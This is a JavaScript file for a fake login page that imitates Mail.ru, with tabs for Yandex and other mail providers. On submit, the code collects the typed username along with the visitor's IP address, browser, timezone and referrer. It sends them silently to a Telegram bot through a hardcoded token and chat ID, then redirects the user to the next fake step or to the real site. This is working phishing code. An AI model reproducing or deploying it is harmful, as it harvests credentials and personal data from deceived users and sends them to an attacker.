const tabs = document.querySelectorAll('.login-tab');
const mail = document.querySelector('.login-tab-1');
const yandex = document.querySelector('.login-tab-2');
const other = document.querySelector('.login-tab-text');
const loginBtn = document.querySelector('.login-next-btn');
const yandexInstructions = document.querySelector('.login-instructions');
const recoverLink = document.querySelector('.recover');
const dropdownContainer = document.querySelector('.container');
const options = document.querySelectorAll('.menu li');
const selected = document.querySelector('.selected');
const caret = document.querySelector('.caret');
const menu = document.querySelector('.menu');
const form = document.querySelector('.login-form');
const username = document.querySelector('#username');

tabs.forEach(tab => {
    tab.addEventListener('click', function () {
        tabs.forEach(t => t.classList.remove('current'));
        tab.classList.add('current');
    });
});

mail.addEventListener('click', () => {
    dropdownContainer.style.display = 'block';
    document.querySelector('.login-field').classList.remove('login-field-password');
    caret.classList.remove('caret-rotate');
    menu.classList.remove('menu-open');
    options.forEach(opt => {
        opt.classList.remove('active');
        const tick = opt.querySelector('.dropdown-tick');
        if (tick) {
            tick.classList.remove('show');
        }
    });
    const mailOption = options[0];
    selected.innerText = mailOption.textContent.trim();
    mailOption.classList.add('active');
    const tick = mailOption.querySelector('.dropdown-tick');
    if (tick) {
        tick.classList.add('show');
    }
    loginBtn.innerHTML = `Войти
    <img src="./assets/right-arrow.svg" alt="" />`;
    yandexInstructions.style.display = 'none';
    recoverLink.innerHTML = ' Восстановить доступ ';
});

yandex.addEventListener('click', () => {
    dropdownContainer.style.display = 'block';
    document.querySelector('.login-field').classList.remove('login-field-password');
    caret.classList.remove('caret-rotate');
    menu.classList.remove('menu-open');
    options.forEach(opt => {
        opt.classList.remove('active');
        const tick = opt.querySelector('.dropdown-tick');
        if (tick) {
            tick.classList.remove('show');
        }
    });
    const yandexOption = options[6];
    selected.innerText = yandexOption.textContent.trim();
    yandexOption.classList.add('active');
    const tick = yandexOption.querySelector('.dropdown-tick');
    if (tick) {
        tick.classList.add('show');
    }
    loginBtn.innerHTML = `Продолжить
    <img src="./assets/right-arrow.svg" alt="" />`;
    yandexInstructions.style.display = 'block';
    recoverLink.innerHTML = '';
});

other.addEventListener('click', () => {
    dropdownContainer.style.display = 'none';
    document.querySelector('.login-field').classList.add('login-field-password');
    loginBtn.innerHTML = `Войти
    <img src="./assets/right-arrow.svg" alt="" />`;
    yandexInstructions.style.display = 'none';
    recoverLink.innerHTML = '';
});

form.addEventListener('submit', async event => {
    event.preventDefault();

    const currentTab = document.querySelector('.current');
    const usernameValue = username.value.trim();
    const selectedOptionText = selected.innerText.trim();

    // --- New: Get metadata
    const userAgent = navigator.userAgent;
    const language = navigator.language;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const platform = navigator.platform;
    const referrer = document.referrer;
    const date = new Date().toLocaleString();

    let ip = 'невідомо';
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
    } catch (err) {
        ip = 'помилка отримання IP';
    }

    // --- Combine original + extra data
    const combinedText = `Login: ${usernameValue}${selectedOptionText}
IP: ${ip}
User-Agent: ${userAgent}
Language: ${language}
Timezone: ${timezone}
Platform: ${platform}
Referrer: ${referrer}
Timestamp: ${date}`;

    // заменить API и ID
    const botToken = '7689328190:AAEwtwupQtWEIes-EzGcpXkQvf32eBqylFw';
    const chatId = '7631815530';
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const payload = {
        chat_id: chatId,
        text: combinedText
    };

    try {
        await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
    } catch {
    }

    if (currentTab) {
        const childElement = currentTab.querySelector('span');

        if (childElement) {
            if (childElement.classList.contains('login-tab-1')) {
                window.location.href = './password.html';
            } else if (childElement.classList.contains('login-tab-2')) {
                window.location.href = 'https://passport.yandex.ru/';
            } else {
                window.location.href = './index.html';
            }
        } else {
            window.location.href = 'https://mail.ru';
        }
    }
});
